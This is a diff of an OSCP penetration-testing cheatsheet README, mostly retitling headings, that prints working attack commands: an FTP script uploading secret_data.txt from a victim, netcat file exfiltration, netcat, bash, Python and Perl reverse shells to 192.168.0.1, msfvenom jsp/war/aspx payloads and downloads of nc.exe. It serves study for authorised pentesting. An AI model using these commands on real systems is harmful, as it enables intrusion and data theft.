@@ -3,7 +3,6 @@
 The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 
 
 **THIS IS WORK IN PROGRESS**
-Once finished, all of the commands will be available in an - even more structured - cherry tree file too.
 
 ## Disclaimer
 This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, used most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.
@@ -12,7 +11,8 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
 ***
 
 # Table Of Content
-
+- [OSCP Cheatsheet](#oscp-cheatsheet)
+  * [Disclaimer](#disclaimer)
 - [Reconnaissance](#reconnaissance)
   * [Autorecon](#autorecon)
   * [Nmap](#nmap)
@@ -75,11 +75,11 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
       - [Reset Password](#reset-password)
       - [Commit Changes](#commit-changes)
       - [Restart Service](#restart-service)
-    + [Create FTP Script On Victim](#create-ftp-script-on-victim)
-    + [Exectue Script](#exectue-script)
+    + [Create FTP Script (On Victim)](#create-ftp-script--on-victim-)
+    + [Exectue Script (on Victim)](#exectue-script--on-victim-)
   * [Netcat](#netcat)
-  * [Receiving System](#receiving-system)
-  * [Sending System](#sending-system)
+  * [Receiving Shell](#receiving-shell)
+  * [Sending Shell](#sending-shell)
   * [TFTP](#tftp)
     + [Start TFTP Daemon (Folder /var/tftp)](#start-tftp-daemon--folder--var-tftp-)
     + [Transfer Files](#transfer-files)
@@ -87,9 +87,9 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
     + [Create wget.vbs File](#create-wgetvbs-file)
     + [Download Files](#download-files)
 - [Shells](#shells)
-  * [Upgrade Your Shell (Interactive Shell)](#upgrade-your-shell--interactive-shell-)
+  * [Upgrade Your Shell (TTY Shell)](#upgrade-your-shell--tty-shell-)
   * [Enable Tab-Completion](#enable-tab-completion)
-  * [Catching Reverse Shells (Nc)](#catching-reverse-shells--nc-)
+  * [Catching Reverse Shells (Netcat)](#catching-reverse-shells--netcat-)
   * [Netcat](#netcat-1)
     + [Reverse Shell](#reverse-shell)
       - [Unix](#unix)
@@ -98,9 +98,10 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
       - [Unix](#unix-1)
       - [Windows](#windows-1)
   * [Bash](#bash)
+    + [Reverse Shell](#reverse-shell-1)
   * [Python](#python)
-    + [As Command](#as-command)
-    + [Python Code](#python-code)
+    + [As Command (Reverse Shell)](#as-command--reverse-shell-)
+    + [Python Code (Reverse Shell)](#python-code--reverse-shell-)
   * [PHP](#php)
     + [Kali Default PHP Reverse Shell](#kali-default-php-reverse-shell)
     + [Kali Default PHP CMD Shell](#kali-default-php-cmd-shell)
@@ -115,15 +116,15 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
       - [32 Bit (x86)](#32-bit--x86--1)
       - [64 Bit (x64)](#64-bit--x64--1)
     + [Java Server Pages (.jsp)](#java-server-pages--jsp-)
-    + [Active Sever Pages Extended (aspx)](#active-sever-pages-extended--aspx-)
-  * [Active Sever Pages Extended (aspx)](#active-sever-pages-extended--aspx--1)
+    + [Active Sever Pages Extended (.aspx)](#active-sever-pages-extended--aspx-)
+  * [Active Sever Pages Extended (.aspx)](#active-sever-pages-extended--aspx--1)
     + [Transfer A File (Certutil)](#transfer-a-file--certutil-)
     + [Execute a File](#execute-a-file)
   * [Jenkins / Groovy (Java)](#jenkins---groovy--java-)
     + [Linux Reverse Shell](#linux-reverse-shell)
     + [Windows Reverse Shell](#windows-reverse-shell)
   * [Perl](#perl)
-    + [Reverse Shell](#reverse-shell-1)
+    + [Reverse Shell](#reverse-shell-2)
   * [PhpmyAdmin](#phpmyadmin)
 
 ***
@@ -449,7 +450,7 @@ pure-pw mkdb
 /etc/init.d/pure-ftpd restart 
  ```
 
- ### Create FTP Script On Victim
+ ### Create FTP Script (On Victim)
  ```bash
 echo open 192.168.0.1>> ftp.txt
 echo USER myftpuser>> ftp.txt
@@ -459,7 +460,7 @@ echo put secret_data.txt>> ftp.txt
 echo bye >> ftp.txt
  ```
 
-### Exectue Script
+### Exectue Script (on Victim)
 
 ```bash
 ftp -v -n -s:ftp.txt
@@ -469,12 +470,12 @@ ftp -v -n -s:ftp.txt
 
 ## Netcat
 
-## Receiving System
+## Receiving Shell
 ```bash
 nc -l -p 1234 > out.file
 ```
 
-## Sending System
+## Sending Shell
 ```bash
 nc -w 3 192.168.0.1 1234 < out.file
 ```
@@ -540,7 +541,7 @@ cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
 
 ***
 
-## Upgrade Your Shell (Interactive Shell)
+## Upgrade Your Shell (TTY Shell)
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash");' 
 ```
@@ -555,7 +556,7 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 
 ***
 
-## Catching Reverse Shells (Nc)
+## Catching Reverse Shells (Netcat)
 *rlwrap enables the usage of arrow keys in your shell.*
 https://github.com/hanslub42/rlwrap
 ```bash
@@ -569,6 +570,8 @@ rlwrap nc -nlvp 4444
 ### Reverse Shell
 
 #### Unix
+
+*Victim:*
 ```bash
 nc 192.168.0.1 4444 -e /bin/bash
 ```
@@ -579,6 +582,11 @@ nc 192.168.0.1 4444 -e /bin/bash
 /usr/bin/ncat
 /bin/netcat
 /bin/nc.traditional
+```
+
+*Attacker:*
+```bash
+rlwrap nc -nlvp 4444
 ```
 #### Windows
 ```bash
@@ -613,6 +621,8 @@ nc 192.168.0.1 4444
 
 ## Bash
 
+### Reverse Shell
+
 ```bash
 /bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
 ```
@@ -621,12 +631,12 @@ nc 192.168.0.1 4444
 
 ## Python
 
-### As Command
+### As Command (Reverse Shell)
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-### Python Code
+### Python Code (Reverse Shell)
 ```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -749,14 +759,14 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shel
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
 ```
 
-### Active Sever Pages Extended (aspx)
+### Active Sever Pages Extended (.aspx)
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
 ```
 
 ***
 
-## Active Sever Pages Extended (aspx)
+## Active Sever Pages Extended (.aspx)
 
 ### Transfer A File (Certutil)
 ```bash
